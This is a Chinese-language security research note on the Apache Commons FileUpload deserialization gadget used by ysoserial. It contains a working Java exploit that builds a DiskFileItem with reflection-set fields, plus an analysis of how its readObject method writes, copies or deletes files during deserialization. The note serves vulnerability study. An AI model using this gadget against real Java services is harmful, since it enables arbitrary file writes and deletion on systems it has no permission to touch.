# FileUpload

FileUpload是Apache提供的上传组件，它本身依赖于commos-io组件,ysoserial中利用了这个组件来任意写、读文件或者目录，但是具体是怎么操作还是和jdk版本有关。

## exp

```java
package dem0.deserialization.FileUpload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import ysoserial.Deserializer;
import ysoserial.Serializer;

import java.io.File;
import java.lang.reflect.Field;

public class Exp1 {
    public static void main(String[] args) throws Exception {
        // 创建文件写入目录 File 对象，以及文件写入内容
        String charset = "UTF-8";
        byte[] bytes   = "hahaha".getBytes(charset);

        // 在 1.3 版本以下，可以使用 \0 截断
        File repository = new File("./123.txt/../");

        // 在 1.3.1 及以上，只能指定目录
//		File   repository = new File("/Users/phoebe/Downloads");

        // 创建 dfos 对象
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        // 使用 repository 初始化反序列化的 DiskFileItem 对象
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // 序列化时 writeObject 要求 dfos 不能为 null
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);

        // 反射将 cachedContent 写入
        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);
        byte[] serialize = Serializer.serialize(diskFileItem);
        Deserializer.deserialize(serialize);
    }
}

```



## 分析

## DiskFileItem

org.apache.commons.fileupload.FileItem表示在POST请求中接收到的文件或者表单项。而`DiskFileItem`是这个的实现类，用来封装一个请求消息实体中的全部项目，在`FileUploadBase#parseRequest`解析时进行封装，动作，动作由 DiskFileItemFactory 的 `createItem` 方法来完成。

![image-20220515094557881](https://img.dem0dem0.top/images/image-20220515094557881.png)

他这里自己重新实现了自己的逻辑，用于在JVM之间迁移HTTP会话，在不同机器中文件存储文件reposity不同。

```java
 private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        // read values
        in.defaultReadObject();

        OutputStream output = getOutputStream();
        if (cachedContent != null) {
            output.write(cachedContent);
        } else {
            FileInputStream input = new FileInputStream(dfosFile);
            IOUtils.copy(input, output);
            dfosFile.delete();
            dfosFile = null;
        }
        output.close();

        cachedContent = null;
    }
```

其实也不难理解，就是这个类在反序列化的时候有对文件的操作，而我们可以控制他的属性，从而来达到文件的操作。

![image-20220515095751793](https://img.dem0dem0.top/images/image-20220515095751793.png)

这里的cachedContent==NULL，可以实现文件复制和删除。